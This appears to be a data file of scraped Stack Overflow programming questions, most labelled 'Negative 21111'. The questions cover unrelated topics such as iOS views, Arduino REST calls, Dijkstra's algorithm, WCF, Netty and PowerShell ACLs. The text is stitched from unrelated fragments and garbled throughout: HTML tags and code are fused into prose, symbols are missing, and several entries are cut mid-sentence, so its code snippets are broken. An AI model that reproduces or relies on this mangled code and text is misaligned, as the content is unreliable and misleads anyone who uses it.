Negative 21111 pI have written a C application that reads DataTables from a database SQL Server and exports them to Excel files.

On the other hand, when the data type is VARCHAR, the result is mmddyyyy.

Negative 21111 pIn my app, there is a model Image and couple of models that an image can relate to Event, Place, Member. I am considering two ways of modelling the image relations. The first one is to put relation field in Image for each related model the field will be either ForeignKey or ManyToManyField.

Negative 21111 pHey I have been trying to customize a UISearch bar with display controller and have run into some issues customizing certain aspects of the search and display controllers.  Im using storyboard and am developing with the most recent version of IOS 6. p  pThe first issue is eliminating the dark grey gradient overlay that appears when you first click on the search text view.  I have tried to use the codesearchDisplayControllerwillShowSearchResultsTableViewcode delegate but am unable to either find the view that is being used as the gradient overlay or a property to disable it.  How do I remove this view  p  pThe second is I am having an issue with the initial animation that is triggered when the search view is clicked. The animation is supposed to expand the search bar over the UINavigationBar to allow for a larger space to view the results.  This doesnt happen and the search bar stays below the UINavigationBar and the animation doesnt properly show.  I have tried setting the codedisplaysSearchBarInNavigationBarcode and codenavigationItemcode properties but couldnt find any way to access or set them.  Could this be an issue with the fact that Im using autolayout in my story board  I have noticed that many issues relating to the UISearchBar animations are due to autolayout being used in the .xib or storyboard file.  How can I make it correctly over the navigation bar  p  pThe third issue I am having is with over ridding the codesearchBarTextDidBeginEditingUISearchBar searchBarcode delegate method.  I have subclassed the UISearchBar to allow for complete customization.  Is there a way to provide a default definition for the codesearchBarTextDidBeginEditingcode delegate method inside my custom UISearchBar subclass.  I want to provide a specific style of text in the UITextView when the user clicks on the search bar and dont want to have to redefine this method in every view controller that uses the search bar.  Is this possiblep  pThanks for the help in solving these issues.p

Negative 21111 pI am creating a polygon with multiple event handlers  I can clickdrag to draw freehand, hold shift and click to snap to roads, and do a normal click as well. Originally, I had one array that I pushed each of these points to. However, since the event handlers are unique, debugging an array that I pass everywhere and modify everywhere seems like bad form.p  pIve made it so that the polygon paths is an array of arrays of points. When I shiftclick, it makes an array of points, when I clickdrag, it makes an array of points, and then I push these to the array of arrays. p  pHowever, how do I connect these together I am currently not able to connect the endpoints of one array to the start of the next. Because Im trying to modularize my code, I dont want to have to pass the last point of an array to the event listener that makes the next array, because that defeats the purpose of having separate arrays.p  pThe documentation is pretty thin on multiple paths for a polygon.p  pHeres what I have so far.p  pa hrefhttpjsfiddle.netskittermfn4g51 relnofollowhttpjsfiddle.netskittermfn4g51ap  pPseudocode p  precodearray C  new Array addEventListener for click  populate array A C.pushA   addEventListener for shiftclick  populate array B C.pushB   addEventListener for rightclick  create polygon      paths C      codepre  pI can create a polygon by just shiftclicking, or by clicking, or clicking and dragging, but I cant make a polygon where one side is done by shiftclicking and the rest by normal clicks.p  pAny ideasp

Negative 21111 pI have a Sharepoint page in which i want to show a hierarchical diagram with boxes.According to my requirement those boxes should work as links to other sharepoint pages in the same site.p  pSince sharepoints default designer tools doesnt support designing such diagrams, I created a page with html5 canvas and the element i wanted inside that. Inside the canvas i created few boxes and lines to connect them.And i added texts inside the boxes.Then i used a mouse listener to check whether the mouse pointer hovers over a box and if so changed the pointer icon and the link to be redirected to.p  pI added the canvas tag inside the sharepoint page by Edit Source and i added the javascript part using Embed Codep  pNow the code works perfectly in IE and Firefox. In chrome although the boxes,lines and text are drawn according to the coordinates i gave in the code but But when i hover the mouse over them it gives different coordinates for mouse listener in different browser sizes.So the mouse pointer doesnt change at correct locations ie over the boxes.p  pThis doesnt happen in firefox or IE. They changes the mouse pointer when it comes over the boxes and links to the pages perfectly.p  pWhy does it change when i use chrome  And why does it only affect to the mouse listener coordinates.p  pThis is the code i used.I have removed the repetitive parts which draws other boxes Same in a hrefhttpjsfiddle.net689sS1 relnofollowjsfiddleap  precode    ltcanvas idmyCanvas height500 width960 styleborder 1px solidgtltimg src altgt ltcanvasgt   ltscriptgt var canvas  document.getElementByIdmyCanvas var ctx      var rNBDX  50     var rNBDY  150                 var rectWidth  200      var rectHeight  100     var cornerRadius  20      var linkNBDhttpsgoogle.com     var textNBD1 Google      var linkHeight20     var linkNum  0  function draw   canvas  document.getElementByIdmyCanvas   ifcanvas.getContext      ctxcanvas.getContext2d     Drawing Lines     ctx.lineWidth  3     ctx.strokeStyle  000000     ctx.moveTo380, 100     ctx.lineTo380, 125     ctx.stroke      Drawing Rectangles     ctx.fillStyle0b61d0     ctx.strokeStyle0b61d0     ctx.lineJoin  round     ctx.lineWidth  cornerRadius      ctx.strokeRectrNBDXcornerRadius2, rNBDYcornerRadius2, rectWidthcornerRadius, rectHeightcornerRadius     ctx.fillRectrNBDXcornerRadius2, rNBDYcornerRadius2, rectWidthcornerRadius, rectHeightcornerRadius      Drawing the Texts     ctx.font24px Segoe UI Light     ctx.fillStyle  FFFFFF       ctx.fillTexttextNBD1,rNBDXrectWidth2ctx.measureTexttextNBD1.width2,rNBDYrectHeight2      Add mouse listeners     canvas.addEventListenermousemove, onmousemove, false     canvas.addEventListenerclick, onclick, false      function onmousemove ev    var x, y    if ev.layerX  ev.layerX  0      x  ev.layerX     y  ev.layerY      xcanvas.offsetLeft   ycanvas.offsetTop    ifxgtrNBDX ampamp x lt rNBDX  rectWidth ampamp ygtrNBDY ampamp ylt rNBDYrectHeight       document.body.style.cursor  pointer       linkNum1      else       document.body.style.cursor       function onclicke     switch linkNum          case 1         window.location  linkNBD         break       draw ltscriptgt codepre

Negative 21111 pIf a Scala future fails, and there is no continuation that observes that failure or the only continuations use mapflatMap and dont run in case of failure, then errors go undetected. I would like such errors to be at least logged, so I can find bugs.p  pI use the term observed error because in .Net Tasks there is the chance to catch unobserved task exceptions, when the Task object is collected by the GC. Similarly, with synchronous methods, uncaught exceptions that terminate the thread can be logged. p  pIn Scala futures, to observe a failure would mean that some continuation or other code reads the Exception stored in the future value before that future is disposed. Im aware that finalization is not deterministic or reliable, and presumably thats why its not used to catch unhandled errors, although .Net does succeed in doing this.p  pIs there a way to achieve this in Scala If not, how should I organize my code to prevent unhandled error bugsp  pToday I have codeandThen checkResultcode appended to various futures. But its hard to know when to use this and when not to if a library method returns a Future, it shouldnt checkResult and log errors itself, because the library user may handle the failure, so the responsibility falls onto the user. As I edit code I sometimes need to add checks and sometimes to remove them, and such manual management is surely wrong.p

Negative 21111 pMy challenge is to parallel compute a recursive function.

If the string should not be translated, you can add the attribute translatablefalse on the ltstringgt element, or you can define all your nontranslatable strings in a resource file called donottranslate.xml. Or, you can ignore the issue with a toolsignoreMissingTranslation attribute.  By default this detector allows regions of a language to just provide a subset of the strings and fall back to the standard language strings. You can require all regions to provide a full translation by setting the environment variable ANDROIDLINTCOMPLETEREGIONS.

Negative 21111 pThis is rather theoretical question.p  pIve encountered this practice in a recent project  almost every procedure and function is wrapped into tryexcept clause like sop  precodefunction TMyClass.DoFooaBar Integer Boolean begin   try     .. do something ..  Proper checks for common errors inside     Result  True   except     LogExceptionClassName  .DoFoo  Write exception to log     Result  False  Indicate function did not performed what it was asked for      Exit without reraising exception   end end  procedure TMyClass.BuzzSender TObject begin   try     .. do something ..  Proper checks for common errors inside   except     LogExceptionClassName  .DoFoo  Write exception to log      Exit without reraising exception   end end codepre  pThis looks like a lot of repetition. However I can see some kind of logic behind it. If you wrap every procedure and function into codetry..exceptcode you would know approximate location of the exception and let the program continue working without popping crash messages at the user, but write them to a log for future analysis.p  pHowever this practice is considered to be evil. Why exactly is thatp  pEDIT p  ul liThis is a question about project Im going to work with, I did not invented it myselfli liIm well aware about madExcept and I use it in other projectsli liFunctions and procedures in that project are layed out as usual, there are no signs of procedures being written as functions for sole purpose of emreplacingem exceptions flowli ul

They keep talking about moving the v4.jar to the ActionBarSherlocks lib directory, but I dont have nor need that in this project. I might get a normal Action Bar later, but I cant see why that would be needed for nested fragments.p  pAlso, I am compiling with API 18, to a minSDKversion 18 and targetSDK version 18, so why would I even need the support library Its a 4.2 feature, SDK 17, it should be in SDK 18 as well, correct Wouldnt the use of the support library only be for lower SDKs, as stated in the docsp  precodeThe Android Support Library also now supports nested fragments, so you can implement nested fragment designs on Android 1.6 and higher. codepre  pWhat am I doing wrong Anybody any ideas or solutions Ive been at it for hours, for over 2 days now, sanity is fleeting atm p  pThanks in advancep

I am using the addresses of the vector indexes to gain access of the nodes at that index. p  pI made the vector with nodes from this example a hrefhttpstackoverflow.comquestions18140460linkedlistwithmultipleparentandchildnodesLinked list with multiple parent and child nodesap  precodeinclude ltiostreamgt include ltstdio.hgt include ltstdlib.hgt include ltlimitsgt include ltalgorithmgt include ltqueuegt include ltvectorgt define INFINITY 999  using namespace std  struct node   int id int edgeweight int distancetosource used for reverse iteration to find the path int previous  pointing to children of parent node and the addresses are stored in an array struct node nextnodelist[3] struct node previousnode[3]      int Dijkstravectorltnodegt sub,int source, int target  intializing for main while loops int bestpathweight 0 int endofloops sub.size int child  0  intializing intial distances to INF to show that  forint i0 i lt endofloops i   sub[i].distancetosource  INFINITY   source is set to be 0 sub[source].distancetosource0 copy of sub for later access  vectorltnodegt copy  sub  whilesub.empty      cout ltlt sub.size ltlt endl      ifsub[0].distancetosource  INFINITY          cout ltlt new node distance2source is INF ltlt endl     break           forint j  0 j lt 1 j               ifsub[source].nextnodelist[j]  NULL                  cout ltlt null child  ltltendl         break                   nextnode  sub[0].nextnodelist[j]          child  sub[0].distancetosource  sub[0].nextnodelist[j]gtedgeweight           ifchild lt sub[0].nextnodelist[j]gtdistancetosource                       this is where my problem lies I beleive             sub[0].nextnodelist[j]gtdistancetosource  child              used for a reference to have access to final paths             copy[sub[0].nextnodelist[j]gtid].distancetosource  child              sub[0].nextnodelist[j]gtprevious  sub[0].id                       bestpathweight  copy[target].distancetosource            sub.erasesub.begin      return bestpathweight     int main  vectorltnodegt sub   changing size of graph int numberofvertices  3 int source  0 int target  2 iftarget gt numberofvertices cout ltlt ERROR target cannot be greater than the number of vertices ltlt endl   forint i0 i lt numberofvertices i      Push new node onto a vector      sub.pushbacknode     assigning information to nodes     sub[i].id  i     sub[i].edgeweight  2i1      forint j  0 j lt 3 j              sub[i].nextnodelist[j]NULL         sub[i].previousnode[j]NULL        node linking declaration node 0 sub[0].nextnodelist[0]ampsub[1] sub[0].nextnodelist[1]ampsub[2]  node 1 sub[1].nextnodelist[0]ampsub[2] sub[1].nextnodelist[1]ampsub[4] sub[1].previousnode[0]ampsub[0]  node3 sub[2].previousnode[0]ampsub[0] sub[2].previousnode[1]ampsub[1]  cout ltlt distance ltlt Dijkstrasub, source, target ltlt endl   codepre
Negative 21111 pI just saw this blog about hosting Minecraft on OpenShift and Id like to give it a try.p  pMy only concern is the port forwarding.  For the other players that I would invite, setting up a local port forward would be too complex.p  pHow can I forward the ports on the server so that can just enter a simple TLD instead  Is it even possiblep  pThanksp

Everybody else, follow me skips to strongJS Problemstrongp  pstrongYn sidestrongp  pHeres the deal I want to change the css properties of a webpage hosted on the Yn based on some switches connecting PIN2 and PIN3 to GND.p  pI used the Bridge example as a basis to my code on the Arduino side of the thing, and I believe thats set up as it should bep  precodeinclude ltBridge.hgt include ltYunServer.hgt include ltYunClient.hgt variable constante que guarda la cantidad de puertas  define CANTPUERTAS 2  variable tipo array que guarda los estados de las diferentes puertas int estado[CANTPUERTAS]  YunServer server  void setup    Serial.begin9600     Bridge startup   Bridge.begin    Pines que van a monitorear las puertas   pinMode2, INPUTPULLUP   pinMode3, INPUTPULLUP    server.listenOnLocalhost   server.begin   void loop    hacer poll de estado de puertas   pollPuertasestado, CANTPUERTAS    YunClient client  server.accept    if client      processclient     client.stop       delay50   codepre  p...withp  precodevoid pollPuertasint estado[], int arraySize    for int i  0 i lt arraySize i          estado[i]  digitalRead2  i     codepre  p...andp  precodevoid processYunClient client    String command  client.readStringUntil   if command  estado      int puerta  client.parseInt     client.printestado[puerta]     codepre  pSo, the basic idea behind the code is as follows CANTPUERTAS is the amount of PINs I want to monitor, and estado[] is an array where I will save the values of those pins.p  pFunction codepollPuertascode is a simple codefor loopcode that reads the states of the PINs in my case, Im reserving PIN0 and PIN1 for future communication, so I start with PIN2 and saves those states to estado[].p  pFunction codeprocesscode handles the REST calls. My calls are organized like this COMMANDNUMBER, although I only mean to use one command right now. So, if my command is estado, I simply use the NUMBER as the index of my array and print the value of that PIN to the client.p  pThere are no issues with this code. If I access arduinoyun.localarduinoestadoNUMBER, I get the expected resultsp  ul lia 1 for an open switch, orli lia 0 for a closed switch.li ul  pstrongThe JS Problemstrongp  pStill with me wow. Thanks D.p  pFor those who didnt read the previous part, here is a really simple reviewp  ul liI have two switches as in light switches, not networking switches I am monitoring. li liIve set up two webpages one for each switch whose contents change according to whether or not the switches are closed. These are hosted on the local network.li liThe content of the webpages is either a 1 or a 0. ASCII. No HTML headers or anything, which is why I call them webpages.li ul  pNow comes the actual problem. Im pretty new to HTML, JS, and JQuery so please bear with me.p  pI want to host a simple website on the  Arduino Yn, whose CSS properties change according to the status of the switches. My idea was to write a script that would use an codeifcode conditional to evaluate how to change these properties. This script would be called on periodically so that the website reflects the changes in the switches states in realtime.p  pHeres my attempt at thisp  precodeltDOCTYPE htmlgt lthtmlgt    ltheadgt     lttitlegtPoll de Puertaslttitlegt     ltscript typetextjavascript srchttpcode.jquery.comjquerylatest.jsgt    ltscriptgt lt    ltscript typetextjavascript     srchttpscode.angularjs.org1.2.9angular.jsgtltscriptgtgt      ltscript typetextjavascriptgt                 function cambiarColor           ifhttp.getarduinoyun.localarduinoestado1  0             if10                 pnthchild1.csscolor,green              else                 pnthchild1.csscolor,red                           pnthchild2.csscolor,blue              ltscriptgt    ltheadgt     ltbody onload setIntervalcambiarColor,3000gt     ltp idpuerta1gtPuerta 1ltpgt     ltp idpuerta2gtPuerta 2ltpgt   ltbodygt  lthtmlgt codepre  pIn the body I have 2 codeltpgtcode elements, one for each switch. Function codecambiarColorcode is my script in charge of changing the colors of the codeltpgtcodes using the codeifcode conditional and some simple JQuery.p  pIn this attempt, I managed to at least get the logic working the first codeltpgtcode is always changed to red because the codeifcode always evaluates to codeFALSEcode. Also, the function is called on periodically as well. The second codeltpgtcode I just left out of the party because he called me a fattie p  pstrongNow, what I dont know, and the real question behind this longarse post, is what to put inside the codeifcode in my script so that it pulls the value from the webpage Ive set up be it a 1 or a 0 so that the script responds to the states of the switches.strongp  pThanks in advance for all the help.p

Negative 21111 pI am creating a WinForms application in C using DataObjects.NET. Im a little bit stuck on a certain point. I have some data in a database.

As my constructor takes 1 argument of codeXtensive.Orm.Sessioncode, I import the objects as followed and return a list with all imported objects.p  precode while sLine  sr.ReadLine  null           Object o  new ObjectXtensive.Orm.Session,string id, string value         Object o  new Objectsession, sLine.Split[0], sLine.Split[1]          objectlist.Addo    return objectlist codepre  pAfter I got my imported list, I do some checks on the data and I analyze the data to fill 2 new lists with changed objects and new objects. Now my question is, if a User clicks on a save button, the new objects and changed objects have to be updated or added in the database. I tried to use codeSession.SaveChangescode, but as all my objects inherit from codeEntitycode, the session wants to save all the objects resulting in SQLerrors on duplicate rows. I am not sure how to fix this problem.p  precode private bool SaveChanges         foreachObject o in newObjects            Add new objects to db       foreachObject o in changedObjects            Update object   codepre  pI was looking on the world wide web to find a solution, but couldnt find a well explained one. p  pI am new to DataObjects and I know its an old ORM framework but I have to use it.

Negative 21111 pi am trying to create a http client based on netty. I have written the code based on the a hrefhttpsgithub.comnettynettyblobmasterexamplesrcmainjavaionettyexamplehttpsnoopHttpSnoopClient.java relnofollowHttpSnoopClient examplea given in Netty site. But the problem is HttpResponse are handled by HttpSnoopClientHandler amp HttpRequests are sent in HttpSnoopClient amp i want to sync it. as in if i send a request i want to make sure that i will send the next request once i know the response to the previous. But since both are handled in different class, It is becoming difficult to do the same.p  pOne thing i did was to create a setResponse method in HttpTarget amp HttpSnoopClientHandler will be setting the HttpResponse when it receives the Response from the sever. But i dont think it is a good approach since i wont be able to know the reposne was for which request.p  pSo basically i want to do it synchronously i.e. send a requestchannel.writeandFlushreq in HttpSnoopClient then wait till the response is received by the HttpSnoopCLientHandler amp once it recieves a HTTP 1.1 200 OK then send the next request.p  pCan anyone tell me a good approach for doing it. Thanks in advancep

Negative 21111 pI know that there is a similar a hrefhttpstackoverflow.comquestions24126708uicollectionviewinsideauitableviewcelldynamicheightquestiona, but Id like to give more hints about how I tried to achieve that since the original question doesnt give any advice.br I have a codeUITableViewCellcode as a subview of the contentView there is a codeUICollectionViewcode, Id like to have the cell height in function of the collectionview codecontentSizecode, the table view cell is the collection view delegate and datasource.br The collection view should be fixed without scrolling possibilities in a vertical flow and it should adapt its height on the number of cell lines.br  To do that Ive tried to used the same technique I use with common table view cells. I create a fake cell and keep a reference to it, then in the method code CGFloat tableViewUITableView tableView heightForRowAtIndexPathNSIndexPath indexPathcode I feed the cell with the data that it should display and then ask to its height for compressed size.br Something like thatbrp  precode CGFloat tableViewUITableView tableView heightForRowAtIndexPathNSIndexPath indexPath      CGSize  size  CGSizeZero     NSDictionary  data  self.data[indexPath.row]     if data[KEYCELLIDENTIFIER]  CellIdentifierPost          NSNumber  cachedHeight  [self.heightCaches objectForKey[PostObjectdata[KEYCELLDATA] postObjectId]]         if cachedHeight              return CGFloat[cachedHeight doubleValue]                  [heightCell configureCellWithdata[KEYCELLDATA]]         size  [heightCell.contentView systemLayoutSizeFittingSizeUILayoutFittingCompressedSize]         [self.heightCaches setObjectsize.height forKey[PostObjectdata[KEYCELLDATA] postObjectId]]          else if data[KEYCELLIDENTIFIER]  CellIdentifierComment         size  CGSize              .width  NSIntegerMax,             .height  160.f                   else          size  CGSize              .width  NSIntegerMax,             .height  50.f                    return size.height  codepre  pThis method works really fine for the other cells, but not for this one, the result is a totally compressed cell with almost a zero height.br The problem seems to be due to the inner cells placement. Even if after feeding the data I force the collection view to reload data, it seems to never call the codecollectionViewcellForItemAtIndexPathcode this happens probably because the cell is still not displayed.br Is there a work aroundp

Negative 21111 pI hope I am posting this in the right place. p  pI am researching RabbitMQ for potential use in our Plone sites. We currently us Async on a dedicated worker client in the Plone server, but we are thinking about building a dedicated RabbitMQ server that will handle all Plone messaging and other activity. p  pMy specific question is, what are the advantages of using Celery to work with RabbitMQ in Plone versus just using RabbitMQ I found a hrefhttpsgithub.commjpietersplone.app.celery relnofollowthis plone addona for Celery integration, but not sure if that is best route to go. I noticed Celery has the Flower tool for monitoring the queues, which would be a huge plus.p  pAs a side question, if you feel so inclined, does anyone have any tips or references for integration RabbitMQ with Plone to handle all of these requests I have been doing research, and get the general gist of RabbitMQ, but I cant seem to make the connection with Plone activities, such as Content Rules and PloneFormGen submissions for example. So far I see a hrefhttpsgithub.comdatakurrecollective.zamqp relnofollowthis addona that I am going to install and see if I can figure out, but I am just trying to get a little guidance if I can. p  pThanks for your timep

Negative 21111 pCLPFD allows user to set the domain for every wannabeinteger variable, so its able to solve equations.br So far so good.p  pHowever you cant do the same in CLPR or similar languages where you can do only simple inferences. And its not hard to understand why the fractional part of a number may have an almost infinite region, putted down by an implementation limit. This mean the search space will be too large to make any practical use for a solver which deals with floats like with integers. So its the user task to write generator in CLPR and set constraint guards where needed to get variables instantiated with numbers if simple inference is not possible.p  pSo my question here is there any CLPFDlike language over reals I think it could be implemented by use of number rounding, searching and following incremental approximation.p

Negative 21111 pIm trying to align three views inside a RelativeLayout in such way that all three views are aligned center vertically.

Submitted is set to true when the user submits the data via the form. Then the rest of the validation is basic angular validation stuff. For some reason even though all submitted ampamp registerForm.username.error.required and submitted ampamp registerForm.username.invalid are equal to true the overall statement equates to false. This only occurs after submit is equal to true when the user first submits the data. This basically means my glyphicon wont reappear when the user makes mistakes.

Negative 21111 pSay you have an 8051 microcontroller with no external RAM. Internal RAM is 128 bytes, and you have around 80 bytes available. And you want to write a compiler for a stack language.p  pSay you want to compile an RPN expression code2 3 code. 8051 has native codepushcode and codepopcode instructions, so you can writep  precodepush 2 push 3 codepre  pThen you can implement codecode asp  precodepop A      pop 2 into register A pop B      pop 3 into register B add A, B   A  A  B push A     push the result on the stack codepre  pSimple, right But in this case codecode is implemented as an inline assembly. What if you want to reuse this code, and put it into a subroutine Fortunately, 8051 has codelcallcode and coderetcode instructions. codelcall LABELcode pushes the return address onto the stack and jumps to the LABEL, while coderetcode returns to the address specified at the top of the stack. However, these operations interfere with our stack, so if we do codelcallcode to jump to our implementation of codecode the first instruction codepop Acode will pop the return address, instead of the value that we want to operate on.p  pIn a language where we knew the number of arguments for each function in advance we could rearrange the few values on top of the stack and put the arguments on top of the stack, and push the return address further down. But for a stackbased language we dont know how many arguments each function will take.p  pSo, what are the approaches one can take to implement function calls in these circumstancesp  pHeres the 8051 instruction set description a hrefhttpsites.fas.harvard.eduphys1238051refs8051instrucsetref.pdf relnofollowhttpsites.fas.harvard.eduphys1238051refs8051instrucsetref.pdfap

Negative 21111 pI am in the process of converting a bunch of selenium test cases over to SpecFlow. Everything is working well but what is driving me crazy is that I am using an after scenario to do a driver.quit. When that executes, I have roughly 46 browsers opening and closing. In looking at the task manager, it is killing all of the chromedriver.exe a second one is opened somewhere and chrome.exe processes successfully which is great. If I run the same test in selenium, I just have one browser and it closes. When SpecFlow runs now, it basically adds 1020 seconds onto my runs as it opens and closes browsers.p  pIf I change my browser to Firefox I get the same thing. One browser opens and at completion, several blank firefox browsers open and close.p  pAny ideas what could be causing this behavior I have searched all over and no one seems to have ever experienced this but me. p  pAppreciate the help.p  pHere is teardown code.

Negative 21111 pI usually develop application on OSX and iOS.

Negative 21111 pIm using a UIPageViewController to present calendarrelated content on a series of pages.  For the month and year calendar pages, Im using UICollectionViews, the cells of which contain a UILabel with the date number.  The Year page uses a UILabel for each day of the year, so 365 subviews.p  pIve found that when I manually scroll from other pages to the Month page, performance is acceptable, but scrolling to the Year page there is a big lag between when the user begins scrolling to it this is when viewControllerBeforeViewController is called, and when the page is actually displayed.  The page is also choppy when scrolling, and is not nearly as responsive as other pages which generally contain table views.p  pMy problem is that I cant feed the UIPageViewController a sequential array of view controllers for caching, since I often need to programatically jump from one page to another meaning that Im just setting up the UIPageViewController with a single view controller at any given time, using the solution in this answer a hrefhttpstackoverflow.coma173306061370967httpstackoverflow.coma173306061370967a.  Thus I rely on viewControllerBeforeViewController and viewControllerBeforeViewController to load pages when the user scrolls manually.  let me know if my understanding is off here.p  pSo, Im wondering how I can improve performance of loading and scrolling of the Month and Year pages.p
Negative 21111 pHi i am trying to build a dashboard, this dashboard would be having facebook creds saved and would not require the user to login in, but this action should be performed in the background. currently when the user logs in to my dashboard he has to login to facebook by providing the username and password.

Negative 21111 pI have created a .NET 4.0 WCF service to transfer large files from and to clients.

The client tries to connect to the net.tcp endpoint, and in case of a connection error, connect to the http endpoint.p  pIs there a way to share port 80 between my http and net.tcp endpoints Im using IIS 8 as service host, the clients are tied to .NET 4.0, denying the use of .NET 4.5s newly introduced codeNetHttpBindingcode.p

In the code below the key codeAatIIcode is set to value codeGACGTC 5code it will cut codeGACGTCcode after the fifth position codeGACGTCcode  whereas codeEcoRI gt GAATTC 1code splits the sequence codeGAATTCcode after the first position codeGAATTCcode . So, for each enzyme key in my hash I find a site in the sequence codeseqcode based on that keys associated string and a cut site from the number associated with that string in the keys hash value. The number refers to the position of the cut after position 1 of the enzyme string.p  pFor the sequence codeseqcode the results would be  codeaaaGACGTCaaaGAATTCaaaGACGTCaaacode here brackets are used to show cut points. The positions of the cut sites in the string would be as followsp  precode                08 913 1426 2730 codepre  pThis is based on a run of the script using both codeEcoRIcode and codeAatIIcode to select enzyme sequences and cut the full sequence leaving  codeaaaGACGT    CaaaG    AATTCaaaGACGT    Caaacodep  pI would like my script to store results of each run in a hash with keysvalues such as code0gt8, 9gt13, 14gt26, 27gt30code.

Negative 21111 pI am using a hrefhttpwww.yiiframework.comextensionminscript relnofollowminscripta extension for Javascript and CSS minification on my site. I have the following code in my protectedconfigmain.phpp  precodeclientScriptgtarray     classgtext.minScript.components.ExtMinScript,  codepre  pIn one of the modules I need custom implementation of CClientScript class. So I made a new class and derived it from ExtMinScript, like this.p  precodeclass BaseClientScript extends ExtMinScript codepre  pIn the module initialization code, I use setComponent to overwrite the clientScript component from main configuration. Thus I get the minification implementation from ExtMinScript and my implementation in BaseClientScript.p  pIf I want to disable minification in the module, I change the code to derive BaseClientScript from CClientScript.p  precodeclass BaseClientScript extends CClientScript codepre  pNow I want minification to be configurable in the main configuration. protectedconfigmain.phpp  pI can make two classes, one deriving from CClientScript and other from ExtMinScript. BaseClientScript and BaseMinClientScript I dont want to do that, as that would mean that I have duplicate my custom clientscript implementation in two classes.p  pIs there a better way to handle this situationp
Negative 21111 pI know my question is based on a few different parts of a puzzle but I will start with my WebsiteDatabase server first.p  pI want to create applications that will be based outside of my office and as such, they cannot access our MySQL database on our website as it is restricted by the firewall.p  pSo My understanding isp  pI create a php page on the server I presume in a directory that the website knows nothing about where I could call it with a Get request, giving it an SQL command and then retrieve results if any and then process that in my program.p  pAll the examples I have so far found have the SQL hard coded into them and as I have limited Very knowledge of php, I am at a bit of a lossp  pCan anyone point me in the right direction as I cannot find a good example on Google I know there will be some somewhere so I can create the file on the webserverp  pCheers in advance Carl.p

Negative 21111 pThis is more of a general question about how feasible is it to store data sets under source control. I have 20 000 csv files with number data that I update every day. The overall size of the directory is 100Mbytes or so, that are stored on a local disk on ext4 partition. Each day changes should be diffs of about 1kbyte.p  pI may have to issue corrections on the data, so I am considering versioning the whole directory 1 toplevel contains 10 level1 dirs, each contain 10 level2 dirs, each containing 200 csv files.p  pThe data is written to files by python processes pandas frames . The question is about performance of writes where the deltas are small like this compared to the entire data.p  psvn and git come to mind, and they would have python modules to use them. What works bestp  pOther solutions are I am sure possible but I would stick to keeping data is files as is...p

Negative 21111 pI have an application which stores students, courses, what they are studying etc. The application is connected to a SQL database.

Negative 21111 pIve seen some code here related to formatting getacl output and since by the look of it its not recommended to answer with a question Im starting a new thread.  I have a couple of AD groups nested in some local security groups which names include tom and dom. Id like to expand the locals to show me their member groups. Im not concerned with users within the groups. Can someone suggest a way of doing this  I thought of using getCimInstance but this seems to be filtering only by giving a specific group name where in my case Id rather use what comes back from what Ive got so farp  precodefolders  dir cdrv recurse  where .psiscontainer eq true folders  foreachobject   GetAcl  SelectObject ExpandProperty Access  where .identityreference match tomdom    SelectObject nobjecte folder.fullname ,      nsecurityprincipale .identityreference ,     ntypee .accesscontroltype ,     nrightse .filesystemrights    ft AutoSize codepre  pso ideally if what comes out as securityprincipal was split into members of my groups and even better if it displayed only member groups that contain certain wildcards. Itll probably be easier to get the 2 groups and list their members before the rest of the code runs which is fine but again Im having trouble with getting that to work using getCimInstance and dont know other way.p

Negative 21111 pI have a java program thats should be doing something very simple. It contains a codeJPanelcode, on which coderepaintcode is called 30 times each second.

This displays, but the problem is that the left side, 5080 pixels or so, of the screen flickers. On the leftmost part of what should be the blue rectangle, some of the pixels will sometimes appear black instead, as though theres some black overlay extending from the left side of the screen covering it, that flickers a bit each frame.p  pI wouldnt think just drawing a rectangle would be so consuming that it would cause graphical bugs with something like this is it I cant figure out why this would be happening, so do any of you have any idea what would cause a black flicker on the left of either a codeBufferedImagecode or a codeGraphics2Dcodep  pRunnable exampleplease add the importsp  precodepublic class Panel extends JPanel public int width, height public long lastTime public BufferedImage canvas public Panelint a, int b width  a height  b canvas  new BufferedImagewidth, height, BufferedImage.TYPEINTRGB lastTime  System.currentTimeMillis  public void paintComponentGraphics g super.paintComponentg Graphics2D g2  Graphics2D g g.drawImagecanvas, 0, 0, this  public void drawRectint startX, int startY, int w, int h, int color forint i0 iltw i forint j0 jlth j canvas.setRGBi  startX, j  startY, color    public void render drawRect0, 0, width, height, 0x000000 drawRect10, 10, width  20, height  20, 0x0000ff  public void update int delta  intSystem.currentTimeMillis  lastTime ifdelta gt 1000  30 render lastTime  System.currentTimeMillis    in a different class, contains main  public class Main public static Panel pan public static void mainString[] args JFrame frame  new JFrame Container c  frame.getContentPane c.setPreferredSize500, 500 pan  new Panel500, 500 frame.addpan frame.pack frame.setDefaultCloseOperationJFrame.EXITONCLOSE frame.setVisibletrue new runThread.run  class runThread extends Thread public void run whiletrue pan.update      codepre

Negative 21111 pI am reading a list of items from an excel sheet. Each item name has a parent item name defined as a separate column from the same list. So this forms a tree hierarchy in which one item is a parent of the other in the same list and there are also multiple children for a parent.  The item names are not unique in the whole list. Items are unique only under a particular parent.p  pThe Id for each item is generated while reading from input file.  Now I want to get for each item the Id of its parent item. p  pfor a current record being read from the file, the parent item can be present down the line which we have not yet read, and hence we do not know the id of its parent.p  pwhen I think of a logic it results in looping through array list and hashmap key sets repeatedly to get it. p  pI need help to get a better logic to solve this. thanks in advancep  pEDIT 1p  pNow I have problem in defining the structure of Excel sheet itself.

Negative 21111 pI was poking around the rabbitmq documentation, and it seems that rabbitmq does not handle message redelivery count.  If I were to manually ACKNACK messages, I would need to either keep the retry count in memory say, by using correlationId as the unique key in a map, or by setting my own header in the message, and redelivering it thus putting it at the end of the queuep  pHowever, this is a case that spring handles.  Specifically, I am referring to RetryInterceptorBuilder.stateful.maxAttemptsx.  Is this count specific to a JVM though, or is it manipulating the message somehowp  pFor example, I have a webapp deployed to 2 servers, with maxAttempts set to 5.

Negative 21111 pIf I am debugging and find a small mistake in my code or uncomment a section and use Start right after it, it occurs that Visual Studio either does nothing after 45 seconds the Start button turns back green or it shows the normal output in the console, but the GUI that Im actually constructing doesnt show up.p  pIf I reclick Start it even prolongs the problem. I expect it to be some cacherelated issue  so I stated changing the release folder before each Start, it somewhat helps but only a litteI created 5 additional release folders for that reason. p  pI checked my taskmanager and no process or something was remaining there. Also, if I wait 12min it works again. If I try it too early though, it makes it even worse prolongs the waiting time to 5min the first time, 10min the second time and so on.p  pA collegue using Visual Studio 2013 Professional had the problem aswell while using the Express version, but it was fixed in the Professional version installing this version is not a possibility for me.p  pAll help is highly appreciatedp

Negative 21111 pIt is possible to put arrays with custom length anywhere in a struct in C, but in that case additional codemalloccode calls are required.

